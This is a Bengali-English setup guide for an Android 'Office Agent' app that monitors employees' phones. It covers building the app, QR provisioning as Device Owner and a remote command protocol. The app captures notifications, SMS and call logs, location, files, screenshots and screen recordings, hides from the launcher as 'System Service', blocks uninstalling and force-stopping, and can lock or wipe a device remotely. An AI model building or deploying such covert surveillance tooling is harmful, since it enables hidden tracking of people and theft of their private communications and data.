# Office Agent App - Setup Guide

## 📱 Overview
এই Agent App তোমার employee-দের device monitor করবে। সব feature:
- ✅ Notification capture (app + content)
- ✅ File Manager
- ✅ Location tracking
- ✅ Call & SMS logs
- ✅ Screen mirror + control + screenshot + recording
- ✅ Lock/Wipe device
- ✅ Boot-এ auto start
- ✅ Launcher থেকে hidden
- ✅ Device Owner mode (permission lock)

APK size: **~2-3 MB** (optimized)

---

## 🔧 Step 1: Build করো

### Prerequisites:
- Android Studio installed
- JDK 11 or higher

### Build commands:
```bash
# Open terminal in AgentApp folder
./gradlew assembleRelease

# APK পাবে:
# app/build/outputs/apk/release/app-arm64-v8a-release.apk
```

**Important:** Build করার আগে `AgentService.kt`-তে **SERVER_URL** change করো:
```kotlin
const val SERVER_URL = "ws://YOUR_DUCKDNS.duckdns.org:7771"
```

---

## 📲 Step 2: Device Owner Setup (QR Provisioning)

### কেন Device Owner?
- Employee permission off করতে পারবে না
- App uninstall করতে পারবে না
- Factory reset ছাড়া remove করা যাবে না

### QR Code Provisioning Steps:

**1. APK তোমার server-এ host করো:**
```bash
# Example: Put APK in Azure VM
scp app-arm64-v8a-release.apk user@yourvm.com:/var/www/html/agent.apk
```

**2. APK-র SHA-256 hash বের করো:**
```bash
# Windows:
certutil -hashfile app-arm64-v8a-release.apk SHA256

# Linux/Mac:
sha256sum app-arm64-v8a-release.apk
```

**3. QR Code JSON বানাও** (provisioning.json):
```json
{
  "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME": "com.office.agent/.receiver.AdminReceiver",
  "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": "https://yourserver.com/agent.apk",
  "android.app.extra.PROVISIONING_DEVICE_ADMIN_SIGNATURE_CHECKSUM": "YOUR_SHA256_HASH_HERE",
  "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": false,
  "android.app.extra.PROVISIONING_WIFI_SSID": "OfficeWifi",
  "android.app.extra.PROVISIONING_WIFI_PASSWORD": "wifi_password",
  "android.app.extra.PROVISIONING_LEAVE_ALL_SYSTEM_APPS_ENABLED": true
}
```

**4. QR Code generate করো:**
- Website use করো: https://qr-code-generator.com/
- JSON টা paste করো
- QR code download করো

**5. Employee device-এ provision করো:**
```
Device factory reset করো
     ↓
Welcome screen-এ 6 বার tap করো (anywhere)
     ↓
QR scanner আসবে
     ↓
তোমার QR scan করাও
     ↓
Automatic setup শুরু হবে:
  - WiFi connect
  - APK download
  - Install
  - Device Owner set ✅
     ↓
Setup complete — employee-এর হাতে দাও
```

---

## 🧪 Step 3: Testing (Development-এ)

QR provisioning production-এর জন্য। Development-এ test করতে চাইলে ADB দিয়ে:

```bash
# 1. APK install করো
adb install app-arm64-v8a-release.apk

# 2. Device Owner set করো
adb shell dpm set-device-owner com.office.agent/.receiver.AdminReceiver

# 3. App launch করো (permission setup)
adb shell am start -n com.office.agent/.MainActivity

# 4. Check logs
adb logcat | grep AgentService
```

---

## 🌐 Step 4: Server Setup

Agent app connect করবে তোমার WebSocket server-এ। Server code পরে দেবো।

**Server requirements:**
- Node.js বা Python
- WebSocket support
- Port 7771 open
- DuckDNS configured

---

## 📋 Command Protocol

Agent app এই commands receive করবে:

### File Commands:
```json
{"cmd": "get_files", "path": "/sdcard/Download", "requestId": "123"}
{"cmd": "read_file", "path": "/sdcard/file.txt", "requestId": "124"}
{"cmd": "delete_file", "path": "/sdcard/file.txt", "requestId": "125"}
```

### Location:
```json
{"cmd": "get_location", "requestId": "126"}
```

### Logs:
```json
{"cmd": "get_calls", "requestId": "127"}
{"cmd": "get_sms", "requestId": "128"}
```

### Device Control:
```json
{"cmd": "lock_device", "requestId": "129"}
{"cmd": "wipe_device", "requestId": "130"}
{"cmd": "get_apps", "requestId": "131"}
{"cmd": "get_device_info", "requestId": "132"}
```

### Screen:
```json
{"cmd": "screen_start", "resultCode": -1, "intentData": "...", "requestId": "133"}
{"cmd": "screen_stop", "requestId": "134"}
{"cmd": "take_screenshot", "requestId": "135"}
```

---

## 🔒 Security Notes

### Legal Requirements:
⚠️ **Employee signing করিয়ে নাও "Device Monitoring Policy"** — এটা must for legal protection.

### What employees will see:
- "System Service" নামে একটা app Settings-এ থাকবে (কিন্তু launcher-এ icon নেই)
- Notification bar-এ "System Service Running" দেখাবে
- Device Admin হিসেবে active থাকবে

### What they CAN'T do:
- ❌ Uninstall করতে পারবে না
- ❌ Force stop করতে পারবে না
- ❌ Permission off করতে পারবে না
- ❌ Battery optimization enable করতে পারবে না

---

## 🐛 Troubleshooting

**App crash হচ্ছে:**
- Logcat দেখো: `adb logcat | grep AgentService`
- Server URL ঠিক আছে কিনা check করো

**Permission denied errors:**
- Device Owner properly set হয়েছে কিনা verify করো
- `get_device_info` command send করে `isDeviceOwner: true` দেখো

**Connection failed:**
- Server running আছে কিনা check করো
- Firewall port 7771 open আছে কিনা
- Device internet আছে কিনা

**Notifications না আসলে:**
- Settings → Apps → Special access → Notification access → Agent app enable করো

---

## 📦 Files Structure

```
AgentApp/
├── app/
│   ├── src/main/
│   │   ├── kotlin/com/office/agent/
│   │   │   ├── MainActivity.kt           ← Entry point
│   │   │   ├── service/
│   │   │   │   ├── AgentService.kt       ← Main service
│   │   │   │   └── NotificationService.kt
│   │   │   ├── socket/
│   │   │   │   └── SocketManager.kt      ← WebSocket
│   │   │   ├── handlers/
│   │   │   │   ├── FileHandler.kt
│   │   │   │   ├── LocationHandler.kt
│   │   │   │   ├── LogHandler.kt
│   │   │   │   ├── DeviceHandler.kt
│   │   │   │   └── ScreenHandler.kt
│   │   │   └── receiver/
│   │   │       ├── AdminReceiver.kt
│   │   │       └── BootReceiver.kt
│   │   ├── AndroidManifest.xml
│   │   └── res/
│   │       └── xml/device_admin.xml
│   ├── build.gradle
│   └── proguard-rules.pro
├── build.gradle
└── settings.gradle
```

---

## ✅ Next Steps

1. ✅ Build APK
2. ✅ Host করো server-এ
3. ✅ QR code বানাও
4. ✅ Test device-এ provision করো
5. ⏳ Server + Web Dashboard বানাবো (পরের step)

---

## 🆘 Support

কোনো issue হলে:
1. Logcat output share করো
2. Device info দাও (Android version, brand)
3. Error message screenshot

---

**Ready for production!** 🚀
